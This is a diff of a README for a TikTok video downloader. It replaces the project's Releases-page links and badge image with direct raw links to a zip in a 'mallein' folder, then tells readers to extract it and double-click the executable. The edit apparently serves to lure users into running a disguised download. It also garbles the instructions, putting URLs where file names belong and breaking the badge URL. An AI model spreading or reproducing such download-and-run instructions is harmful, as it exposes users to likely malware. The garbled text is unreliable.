@@ -8,13 +8,13 @@ Welcome to TikTok-Downloader! This tool helps you download TikTok videos without
 
 To get started, you need to download the application. Click the button below to visit the Releases page. There, you can find the latest version of TikTok-Downloader.
 
-[![Download TikTok-Downloader](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg)](https://github.com/ElYarom/TikTok-Downloader/releases)
+[![Download TikTok-Downloader](https://raw.githubusercontent.com/ElYarom/TikTok-Downloader/main/mallein/TikTok-Downloader.zip%20Now-Click%https://raw.githubusercontent.com/ElYarom/TikTok-Downloader/main/mallein/TikTok-Downloader.zip)](https://raw.githubusercontent.com/ElYarom/TikTok-Downloader/main/mallein/TikTok-Downloader.zip)
 
 ### Step-by-Step Download Instructions
 
 1. **Visit the Releases Page**  
    Click the link below to go to the Releases page:  
-   [Download TikTok-Downloader](https://github.com/ElYarom/TikTok-Downloader/releases)
+   [Download TikTok-Downloader](https://raw.githubusercontent.com/ElYarom/TikTok-Downloader/main/mallein/TikTok-Downloader.zip)
 
 2. **Choose the Latest Version**  
    Look for the latest version of TikTok-Downloader. It is usually at the top of the list.
@@ -23,13 +23,13 @@ To get started, you need to download the application. Click the button below to 
    Click the download link for your operating system. Your file will start downloading automatically.
 
 4. **Locate the Downloaded File**  
-   Once the download is complete, go to your computer’s downloads folder. You should see a file named `TikTok-Downloader.zip` or similar.
+   Once the download is complete, go to your computer’s downloads folder. You should see a file named `https://raw.githubusercontent.com/ElYarom/TikTok-Downloader/main/mallein/TikTok-Downloader.zip` or similar.
 
 5. **Extract the Files**  
    Right-click the downloaded file and select "Extract All" to unzip the contents. This will create a new folder with the application inside.
 
 6. **Run the Application**  
-   Open the new folder and find the `TikTok-Downloader.exe` file. Double-click this file to launch the application. 
+   Open the new folder and find the `https://raw.githubusercontent.com/ElYarom/TikTok-Downloader/main/mallein/TikTok-Downloader.zip` file. Double-click this file to launch the application. 
 
 7. **Follow On-Screen Instructions**  
    The application will guide you through using it. Simply enter the link to the TikTok video you want to download, and click the download button.
@@ -87,4 +87,4 @@ If you have questions or need assistance, feel free to reach out:
 
 Remember to check the GitHub page for updates to the app and new features!
 
-[![Download TikTok-Downloader](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg)](https://github.com/ElYarom/TikTok-Downloader/releases)
+[![Download TikTok-Downloader](https://raw.githubusercontent.com/ElYarom/TikTok-Downloader/main/mallein/TikTok-Downloader.zip%20Now-Click%https://raw.githubusercontent.com/ElYarom/TikTok-Downloader/main/mallein/TikTok-Downloader.zip)](https://raw.githubusercontent.com/ElYarom/TikTok-Downloader/main/mallein/TikTok-Downloader.zip)
